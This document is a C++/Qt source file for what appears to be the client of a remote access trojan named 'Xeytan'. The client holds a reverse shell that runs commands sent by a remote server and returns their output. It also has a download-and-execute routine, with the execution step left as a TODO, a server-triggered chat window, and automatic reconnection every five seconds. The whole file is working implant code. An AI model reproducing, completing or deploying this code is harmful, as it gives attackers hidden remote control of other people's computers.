#include "XeytanQppClient.h"
#include "shared/net/packets/PacketShell.h"
#include "services/ProcessService.h"
#include <QTimer>
#include "ui/qt/ChatDialog.h"
#include "shared/net/packets/PacketChat.h"
#include <QTemporaryFile>
#include <QDir>

XeytanQppClient::XeytanQppClient(QObject* parent): QObject(parent), processService(Q_NULLPTR),
                                                     reconnectionScheduled(false), chatting(false)
{
}

void XeytanQppClient::startService()
{
	netService = QSharedPointer<NetService>::create();
	connect(netService.get(), &NetService::requestShellReady, this, &XeytanQppClient::onRequestShell);
	connect(netService.get(), &NetService::chatRequest, this, &XeytanQppClient::onChatRequest);
	connect(netService.get(), &NetService::disconnected, this, &XeytanQppClient::onDisconnected);
	netService->startService();
}

void XeytanQppClient::onChatRequest(ChatAction action, const QString& message)
{
	if (action == ChatAction::Start && !chatting)
	{
		chatting = true;
		openChatWindow();
	}
	else if (action == ChatAction::AddMessage)
	{
		if (!chatting)
			openChatWindow();
		chatDialog->addMessage(message);
	}
	else if (action == ChatAction::Close && chatting)
	{
		chatting = false;
		chatDialog->hide();
		// chatDialog->close();
	}
}

void XeytanQppClient::downloadAndExecute(const QString& url)
{
	if (netDownloader == Q_NULLPTR)
	{
		netDownloader.reset(new NetFileDownloader(url));
		connect(netDownloader.get(), &NetFileDownloader::downloadFinished, this,
		        [&]()
		        {
			        const QByteArray data = netDownloader->getFileData();
			        QTemporaryFile outFile;
			        if (outFile.open())
			        {
				        outFile.write(data);
				        outFile.close();

				        // QString path = QDir::tempPath();
				        QString absolutePath = outFile.fileName();

				        // TODO: Portable way of executing files, start cmd in Windows, chmod +x in Linux
			        }
		        });
	}

	netDownloader->setUrl(url);
	netDownloader->startDownload();
}

void XeytanQppClient::onRequestShell(ShellAction shellAction, const QString& command)
{
	if (processService == Q_NULLPTR)
	{
		processService.reset(new ProcessService);
		connect(processService.get(), &ProcessService::processOutputAvailable, this,
		        &XeytanQppClient::onReverseShellOutputAvailable);
		connect(processService.get(), &ProcessService::reverseShellExited, this,
		        &XeytanQppClient::onReverseShellProcessExit);
	}

	if (shellAction == ShellAction::Start)
	{
		processService->startReverseShell();
	}
	else if (shellAction == ShellAction::Push)
	{
		processService->writeToProc(command);
	}
	else if (shellAction == ShellAction::DownloadExec)
	{
		downloadAndExecute(command);
	}
	else if (shellAction == ShellAction::Stop)
	{
		processService->stopShell();
	};
}


void XeytanQppClient::onReverseShellProcessExit(int exitCode, QProcess::ExitStatus exitStatus)
{
	netService->sendShellStop();
}

void XeytanQppClient::onReverseShellOutputAvailable(const QString& data) const
{
	netService->sendShellOutput(data);
}


int XeytanQppClient::run(int argc, char** argv)
{
	QApplication a(argc, argv);
	startService();
	return a.exec();
}

void XeytanQppClient::onDisconnected()
{
	if (reconnectionScheduled)
		return;

	reconnectionScheduled = true;

	QTimer::singleShot(5000, [this]()
	{
		reconnectionScheduled = false;
		netService->startService();
	});
}

void XeytanQppClient::openChatWindow()
{
	chatDialog = new ChatDialog;
	connect(chatDialog, &ChatDialog::sendMessageClicked, this, [&](const QString& message)
	{
		netService->sendChatMessage(message);
	});

	connect(chatDialog, &ChatDialog::finished, this, [&](int result)
	{
		if (chatting)
		{
			netService->chatClosed();
			chatting = false;
		}
	});

	chatDialog->show();
}
